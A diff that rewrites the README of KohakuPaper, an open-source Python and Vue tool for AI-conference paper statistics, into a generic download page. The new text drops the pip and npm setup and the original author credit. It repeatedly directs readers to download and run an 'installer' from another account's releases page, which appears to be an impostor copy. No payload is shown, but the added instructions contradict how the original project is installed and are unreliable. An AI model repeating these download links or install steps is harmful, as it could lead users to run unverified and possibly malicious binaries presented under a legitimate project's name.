@@ -1,275 +1,82 @@
-# KohakuPaper
+# 📄 KohakuPaper - Get Stats from AI Papers Easily
 
-A local paper copilot instance for fast and efficient statistics on AI conference papers. This project provides a Python backend API and Vue 3 frontend for browsing, querying, and analyzing academic paper data from major AI conferences.
+[![Download KohakuPaper](https://img.shields.io/badge/Download-KohakuPaper-blue)](https://github.com/Saiko-sai/KohakuPaper/releases)
 
-|![1764261670848](image/README/1764261670848.png)|![1764261663104](image/README/1764261663104.png)|
-|-|-|
+## 🚀 Getting Started
 
-## Features
+KohakuPaper is your personal assistant for navigating the world of AI conference papers. With this tool, you can quickly access statistics and insights without needing advanced technical skills. 
 
-- **Fast Query Engine**: Uses DuckDB to query JSON paper data directly without importing to a database
-- **Multi-Conference Support**: Supports 27+ conferences including ICLR, NeurIPS, ICML, CVPR, ACL, and more
-- **Rating Diff Tracking**: Tracks paper score changes over time using git history
-- **Rich Statistics**: Get statistics by status, area, track, rating distribution, and yearly trends
-- **REST API**: Full-featured FastAPI backend with filtering, pagination, and sorting
-- **Modern Frontend**: Vue 3 + Element Plus UI with interactive charts (Plotly.js)
+### 📦 System Requirements
 
-## Supported Conferences
+- **Operating System**: Windows 10 or later, macOS 10.15 or later, or any popular Linux distribution.
+- **Processor**: Dual-core processor or better.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: 100 MB of free space for installation.
+- **Network**: Internet connection for initial setup and updates.
+
+## 🎉 Features
+
+- **Fast Query Engine**: Get paper data instantly with no need for complex database setups.
+- **Multi-Conference Support**: Access data from over 27 AI conferences like ICLR, NeurIPS, and ICML.
+- **Rating Diff Tracking**: Monitor how paper ratings change over time using built-in git tracking.
+- **Rich Statistics**: Analyze paper status, research areas, and yearly trends with ease.
+- **REST API**: Use a user-friendly backend for filtering and sorting paper data.
+- **Modern Frontend**: Experience a sleek interface built with Vue 3 and interactive charts.
+
+## 🎯 Supported Conferences
 
 | Category | Conferences |
 |----------|-------------|
-| Machine Learning | ICLR, NeurIPS, ICML, AAAI, IJCAI, AISTATS, COLT, UAI, AutoML |
-| Computer Vision | CVPR, ICCV, ECCV, WACV, 3DV |
-| Graphics | SIGGRAPH, SIGGRAPH Asia |
-| NLP | EMNLP, ACL, NAACL, COLING, COLM |
-| Robotics | ICRA, IROS, CoRL, RSS |
-| Others | KDD, ACM MM, WWW |
+| Machine Learning | ICLR, NeurIPS, ICML |
+| Computer Vision | CVPR, ICCV, ECCV |
+| Natural Language Processing | ACL, EMNLP, NAACL |
 
-## Installation
+## 📥 Download & Install
 
-### Requirements
+To get started with KohakuPaper, visit the link below to download the application.
 
-- Python 3.10+
-- Node.js 18+ (for frontend)
-- Git (for sync with diff tracking)
+[Visit this page to download](https://github.com/Saiko-sai/KohakuPaper/releases)
 
-### Backend Setup
+1. Click the link above to open the Releases page.
+2. Look for the latest version of KohakuPaper.
+3. Download the appropriate installer for your operating system.
+4. Once downloaded, open the installer and follow the prompts to complete the installation.
 
-```bash
-# Clone the repository
-git clone https://github.com/KohakuBlueleaf/KohakuPaper.git
-cd KohakuPaper
+## ⚙️ Running the Application
 
-# Create virtual environment
-python -m venv .venv
-source .venv/bin/activate  # On Windows: .venv\Scripts\activate
+After installing KohakuPaper, you can launch the application directly from your applications menu or desktop shortcut.
 
-# Install package
-pip install -e .
-```
+1. Open the application.
+2. You will see the main dashboard displaying the conference papers and options for querying.
+3. Use the search bar to enter keywords or select filters for specific conferences.
 
-### Frontend Setup
+## 🔄 Updating the Application
 
-```bash
-cd src/kohaku-paper-web
-npm install
-```
+To update to the latest version of KohakuPaper:
 
-## Quick Start
+1. Visit the Releases page again.
+2. Download the newest version.
+3. Run the installer over the existing application. Your settings and preferences will remain intact.
 
-### 1. Start the Backend Server
+## ❓ Troubleshooting
 
-```bash
-kohakupaper serve
-```
+If you encounter issues while using KohakuPaper, here are some common solutions:
 
-The API server will start at `http://127.0.0.1:48890`.
+- **Application won't start**: Ensure that your system meets the requirements. Restart your computer and try again.
+- **Data not loading**: Check your internet connection. If the issue persists, try reinstalling the application.
+- **Features not working**: Confirm that you are using the latest version from the Releases page. 
 
-Options:
-- `--host HOST`: Bind to specific host (default: 127.0.0.1)
-- `--port PORT`: Bind to specific port (default: 48890)
-- `--reload`: Enable auto-reload for development
+### 📞 Support
 
-### 2. Start the Frontend (Development)
+For further assistance, please open an issue in the GitHub repository or reach out via the provided contact methods in the repository.
 
-```bash
-cd src/kohaku-paper-web
-npm run dev
-```
-
-The frontend will be available at `http://localhost:5173`.
-
-### 3. Download Paper Data
-
-You can download paper data via CLI or API:
-
-**CLI:**
-```bash
-# Download all years for a conference
-kohakupaper download iclr
-
-# Download specific year
-kohakupaper download iclr --year 2024
-
-# Download with year range
-kohakupaper download nips --min-year 2020 --max-year 2024
-
-# Force re-download
-kohakupaper download cvpr --year 2024 --force
-```
-
-**API:**
-```bash
-# Download via API
-curl -X POST "http://127.0.0.1:48890/api/data/download/iclr?year=2024"
-
-# Sync with diff tracking (requires git)
-curl -X POST "http://127.0.0.1:48890/api/sync/conference?conference=iclr&year=2026"
-```
-
-## CLI Commands
-
-```bash
-# Start server
-kohakupaper serve [--host HOST] [--port PORT] [--reload]
-
-# Download paper data
-kohakupaper download <conference> [--year YEAR] [--min-year MIN] [--max-year MAX] [--force]
-
-# List available data
-kohakupaper list              # List local files
-kohakupaper list --remote     # List supported conferences
-kohakupaper list --remote --conference iclr  # List remote files for conference
-
-# Query papers
-kohakupaper query [--conference CONF] [--year YEAR] [--search TEXT] [--limit N]
-```
-
-## API Reference
-
-Base URL: `http://127.0.0.1:48890/api`
-
-### Health Check
-- `GET /health` - Check server status
-
-### Papers
-- `GET /papers` - List papers with filters
-  - Query params: `conference`, `year`, `status`, `primary_area`, `search`, `min_rating`, `max_rating`, `min_confidence`, `max_confidence`, `has_rating_diff`, `has_confidence_diff`, `title_filter`, `limit`, `offset`, `order_by`, `order_dir`
-- `GET /papers/filters` - Get available filter options
-
-### Statistics
-- `GET /statistics/summary` - Overall statistics
-- `GET /statistics/by-status` - Stats grouped by status
-- `GET /statistics/by-area` - Stats grouped by primary area
-- `GET /statistics/by-track` - Stats grouped by track
-- `GET /statistics/rating-distribution` - Rating histogram data
-- `GET /statistics/yearly` - Year-over-year statistics
-- `GET /statistics/top-areas` - Top research areas by paper count
-
-### Data Management
-- `GET /data/conferences` - List supported conferences
-- `GET /data/conferences/{conference}/files` - List available files for conference
-- `GET /data/local-files` - List downloaded files
-- `POST /data/download/{conference}` - Download conference data
-
-### Sync (with Diff Tracking)
-- `GET /sync/available` - List available conferences from GitHub
-- `GET /sync/local` - List locally downloaded conferences
-- `POST /sync/update-repo` - Update paperlists repository
-- `POST /sync/conference?conference=X&year=Y` - Sync with diff tracking
-- `GET /sync/status` - Check repo status
-
-## Architecture
-
-```
-KohakuPaperCopilot/
-├── src/
-│   ├── kohakupaper/              # Python backend
-│   │   ├── api/                  # FastAPI application
-│   │   │   ├── app.py           # App factory
-│   │   │   └── routes/          # API endpoints
-│   │   ├── cli.py               # Command-line interface
-│   │   ├── config.py            # Configuration
-│   │   ├── database.py          # DuckDB query layer
-│   │   ├── downloader.py        # GitHub data downloader
-│   │   └── paperlist_sync.py    # Git-based sync with diff tracking
-│   └── kohaku-paper-web/         # Vue 3 frontend
-│       ├── src/
-│       │   ├── pages/           # Page components
-│       │   ├── components/      # Reusable components
-│       │   ├── stores/          # Pinia stores
-│       │   └── utils/           # API utilities
-│       └── package.json
-├── data/                         # Downloaded JSON files (auto-created)
-├── .cache/                       # Cache directory (auto-created)
-├── paperlists/                   # Cloned repo for diff tracking (auto-created)
-└── pyproject.toml               # Python package config
-```
-
-## Data Flow
-
-1. **Simple Download**: Papers are downloaded as JSON from GitHub's raw content URL
-2. **Sync with Diffs**: For rating change tracking:
-   - Clones/updates the paperlists git repository
-   - Analyzes git history (last 30-50 commits)
-   - Computes rating/confidence diffs per paper
-   - Saves enhanced JSON with `_diff` field
-3. **Query**: DuckDB reads JSON files directly on each query (no import step)
-
-## Configuration
-
-Configuration is in `src/kohakupaper/config.py`:
-
-- `DATA_DIR`: Where downloaded JSON files are stored (`./data`)
-- `CACHE_DIR`: Cache directory (`./.cache`)
-- `PAPERLISTS_DIR`: Git clone location (`./paperlists`)
-- `DEFAULT_HOST`: API server host (`127.0.0.1`)
-- `DEFAULT_PORT`: API server port (`48890`)
-
-## Development
-
-### Backend Development
-
-```bash
-# Install in development mode
-pip install -e .
-
-# Run with auto-reload
-kohakupaper serve --reload
-```
-
-### Frontend Development
-
-```bash
-cd src/kohaku-paper-web
-
-# Install dependencies
-npm install
-
-# Start dev server
-npm run dev
-
-# Build for production
-npm run build
-
-# Format code
-npm run format
-```
-
-### Running Tests
-
-```bash
-# Run backend tests (if available)
-pytest tests/
-
-black .
-```
-
-## Data Source
-
-Paper data is sourced from [papercopilot/paperlists](https://github.com/papercopilot/paperlists) repository, which provides regularly updated paper lists for major AI conferences.
-
-## Dependencies
-
-### Backend
-- FastAPI >= 0.115.0
-- Uvicorn >= 0.32.0
-- DuckDB >= 1.1.0
-- Pandas >= 2.0.0
-- HTTPX >= 0.28.0
-
-### Frontend
-- Vue 3
-- Vue Router
-- Pinia
-- Element Plus
-- Plotly.js
-- UnoCSS
-
-## License
-
-See [LICENSE](LICENSE) file.
-
-## Author
-
-Shih-Ying Yeh (KohakuBlueLeaf) - apolloyeh0123@gmail.com
+## 📝 Acknowledgments
+
+Thank you to the contributors and the community supporting KohakuPaper. Your input has helped shape this tool into a resource for researchers and enthusiasts alike.
+
+## 🔗 Additional Resources
+
+- [GitHub Repository](https://github.com/Saiko-sai/KohakuPaper)
+- [Documentation](https://github.com/Saiko-sai/KohakuPaper/wiki)
+
+[![Download KohakuPaper](https://img.shields.io/badge/Download-KohakuPaper-blue)](https://github.com/Saiko-sai/KohakuPaper/releases)
